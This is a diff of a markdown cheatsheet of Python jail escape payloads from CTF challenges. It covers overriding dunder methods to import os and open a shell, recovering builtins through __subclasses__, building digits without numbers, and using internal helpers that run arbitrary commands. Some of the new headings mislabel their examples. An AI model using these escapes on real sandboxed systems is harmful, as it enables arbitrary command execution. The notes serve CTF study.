@@ -1,41 +1,45 @@
-# Python jail
+# Python Jail Escape Techniques
 
-References:
+This document provides a comprehensive collection of Python jail escape techniques from various CTF challenges. Python jails restrict execution by filtering characters, banning builtins, or limiting available operations.
+
+**References:**
 
 - [Pyjail Cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet/)
 - [Pyjail collection](https://github.com/jailctf/pyjail-collection)
 - [A collection of pyjails](https://github.com/salvatore-abello/pyjail/tree/main)
 
-Table of contents:
+**Table of contents:**
 
 * TOC
 {:toc}
 
-## cheatsheet
+## Quick Reference Cheatsheet
 
-### Unicode bypass
+### Unicode Character Bypass
 
-See [details](./pyjail/unicode-bypass.md).
+Use Unicode characters that look like ASCII but bypass filters. See [details](./pyjail/unicode-bypass.md).
 
-### Assign to variables
+### Variable Assignment Without `=`
 
-- `a=1` in exec
-- `[a:=1]` in eval
-- `[a for a in [1]]`
-- `[[a]for[a]in[[1]]]`
+- **In `exec` contexts:** `a=1` (normal assignment)
+- **In `eval` contexts:** `[a:=1]` (walrus operator)
+- **List comprehension:** `[a for a in [1]]`
+- **Compact form with spaces:** `[[a]for[a]in[[1]]]`
 
-### Call functions
+### Function Calls Without Parentheses
+- **`__import__('os')` alternatives:**
+  - `help.__class__.__getitem__ = __import__;help['os']`
+  - `help.__class__.__contains__ = __import__('os').system;'sh' in help`
+  - `ExceptionGroup.__class_getitem__ = __import__; ExceptionGroup["os"]`
+  - `help.__class__.__getattr__ = __import__; help.os`
+- **`breakpoint()`:** `license._Printer__setup = breakpoint; str(license)`
+- **`exec(input())`:** `@exec\n@input\nclass a: pass`
 
-- `__import__('os')`: `help.__class__.__getitem__ = __import__;help['os']` or `help.__class__.__contains__ = __import__('os').system;'sh' in help` for object, `ExceptionGroup.__class_getitem__ = __import__;ExceptionGroup["os"]` for class
-- `breakpoint()`: `license._Printer__setup = breakpoint; str(license)`
-- `exec(input())`: `@exec\n@input\nclass a: pass`
+### String Construction Without Quotes
 
-### Construct strings
+- **Character extraction:** `help.__doc__[index]` (extract from existing strings)
 
-- `__import__('os')`: `help.__class__.__getattr__ = __import__;help.os`
-- `help.__doc__[index]`
-
-### No builtins
+### Accessing Builtins When Banned
 
 - `().__class__.__base__.__subclasses__()`
 - `().__class__.__mro__[1].__subclasses__()`
@@ -43,16 +47,16 @@ See [details](./pyjail/unicode-bypass.md).
 - `().__reduce_ex__(2)[0].__globals__`
 - `().__setattr__.__objclass__.__subclasses__()`
 
-### No numbers/booleans
+### Numbers and Booleans Without Digits
 
-- `True`
-- `[]>[]` is `False`
-- `[[]]>[]` is `True`
-- `[]is[]` is `False`
-- `not[]is[]` is `True`
-- `-~x` is `x+1`
+- **`True`:** Available directly
+- **`True` alternative:** `[[]]>[]`
+- **`True` alternative:** `not[]is[]`
+- **`False`:** `[]>[]`
+- **`False` alternative:** `[]is[]`
+- **Increment:** `-~x` equals `x + 1`
 
-### Get python/bash shell
+### Obtaining Shell Access
 
 - `_aix_support._read_cmd_output(cmd)`
 - `_osx_support._read_output(cmd)`
